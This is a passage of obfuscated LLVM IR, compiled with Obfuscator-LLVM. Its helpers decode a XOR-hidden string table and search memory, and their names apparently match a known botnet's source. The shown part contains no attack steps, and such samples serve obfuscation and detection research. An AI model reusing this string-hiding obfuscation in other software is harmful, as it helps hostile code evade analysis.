  %93 = trunc i32 %91 to i8
  store i8 %93, i8* %79, align 1
  %94 = load i8, i8* %7, align 1
  %95 = zext i8 %94 to i32
  %96 = load %struct.table_value*, %struct.table_value** %4, align 8
  %97 = getelementptr inbounds %struct.table_value, %struct.table_value* %96, i32 0, i32 0
  %98 = load i8*, i8** %97, align 8
  %99 = load i32, i32* %3, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds i8, i8* %98, i64 %100
  %102 = load i8, i8* %101, align 1
  %103 = sext i8 %102 to i32
  %104 = xor i32 %103, -1
  %105 = and i32 130808296, %104
  %106 = xor i32 130808296, -1
  %107 = and i32 %103, %106
  %108 = xor i32 %95, -1
  %109 = and i32 %108, 130808296
  %110 = and i32 %95, %106
  %111 = or i32 %105, %107
  %112 = or i32 %109, %110
  %113 = xor i32 %111, %112
  %114 = xor i32 %103, %95
  %115 = trunc i32 %113 to i8
  store i8 %115, i8* %101, align 1
  %116 = load i8, i8* %8, align 1
  %117 = zext i8 %116 to i32
  %118 = load %struct.table_value*, %struct.table_value** %4, align 8
  %119 = getelementptr inbounds %struct.table_value, %struct.table_value* %118, i32 0, i32 0
  %120 = load i8*, i8** %119, align 8
  %121 = load i32, i32* %3, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i8, i8* %120, i64 %122
  %124 = load i8, i8* %123, align 1
  %125 = sext i8 %124 to i32
  %126 = xor i32 %125, -1
  %127 = and i32 -1564692034, %126
  %128 = xor i32 -1564692034, -1
  %129 = and i32 %125, %128
  %130 = xor i32 %117, -1
  %131 = and i32 %130, -1564692034
  %132 = and i32 %117, %128
  %133 = or i32 %127, %129
  %134 = or i32 %131, %132
  %135 = xor i32 %133, %134
  %136 = xor i32 %125, %117
  %137 = trunc i32 %135 to i8
  store i8 %137, i8* %123, align 1
  br label %138

; <label>:138:                                    ; preds = %54
  %139 = load i32, i32* %3, align 4
  %140 = add i32 %139, 2007831893
  %141 = add i32 %140, 1
  %142 = sub i32 %141, 2007831893
  %143 = add nsw i32 %139, 1
  store i32 %142, i32* %3, align 4
  br label %47

; <label>:144:                                    ; preds = %47
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %2
  %12 = load %struct.table_value*, %struct.table_value** %5, align 8
  %13 = getelementptr inbounds %struct.table_value, %struct.table_value* %12, i32 0, i32 1
  %14 = load i16, i16* %13, align 8
  %15 = zext i16 %14 to i32
  %16 = load i32*, i32** %4, align 8
  store i32 %15, i32* %16, align 4
  br label %17

; <label>:17:                                     ; preds = %11, %2
  %18 = load %struct.table_value*, %struct.table_value** %5, align 8
  %19 = getelementptr inbounds %struct.table_value, %struct.table_value* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  ret i8* %20
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_memsearch(i8*, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* %9, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %12, %13
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %4
  store i32 -1, i32* %5, align 4
  br label %60

; <label>:16:                                     ; preds = %4
  store i32 0, i32* %10, align 4
  br label %17

; <label>:17:                                     ; preds = %52, %16
  %18 = load i32, i32* %10, align 4
  %19 = load i32, i32* %7, align 4
  %20 = icmp slt i32 %18, %19
  br i1 %20, label %21, label %59

; <label>:21:                                     ; preds = %17
  %22 = load i8*, i8** %6, align 8
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds i8, i8* %22, i64 %24
  %26 = load i8, i8* %25, align 1
  %27 = sext i8 %26 to i32
  %28 = load i8*, i8** %8, align 8
  %29 = load i32, i32* %11, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %27, %33
  br i1 %34, label %35, label %50

; <label>:35:                                     ; preds = %21
  %36 = load i32, i32* %11, align 4
  %37 = sub i32 0, %36
  %38 = sub i32 0, 1
  %39 = add i32 %37, %38
  %40 = sub i32 0, %39
  %41 = add nsw i32 %36, 1
  store i32 %40, i32* %11, align 4
  %42 = load i32, i32* %9, align 4
  %43 = icmp eq i32 %40, %42
  br i1 %43, label %44, label %49

; <label>:44:                                     ; preds = %35
  %45 = load i32, i32* %10, align 4
  %46 = sub i32 0, 1
  %47 = sub i32 %45, %46
  %48 = add nsw i32 %45, 1
  store i32 %47, i32* %5, align 4
  br label %60

; <label>:49:                                     ; preds = %35
  br label %51

; <label>:50:                                     ; preds = %21
  store i32 0, i32* %11, align 4
  br label %51

; <label>:51:                                     ; preds = %50, %49
  br label %52

; <label>:52:                                     ; preds = %51
  %53 = load i32, i32* %10, align 4
  %54 = sub i32 0, %53
  %55 = sub i32 0, 1
  %56 = add i32 %54, %55
  %57 = sub i32 0, %56
  %58 = add nsw i32 %53, 1
  store i32 %57, i32* %10, align 4
  br label %17

; <label>:59:                                     ; preds = %17
  store i32 -1, i32* %5, align 4
  br label %60

; <label>:60:                                     ; preds = %59, %44, %15
  %61 = load i32, i32* %5, align 4
  ret i32 %61
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146810738}
!2 = !{i32 -2146810329}
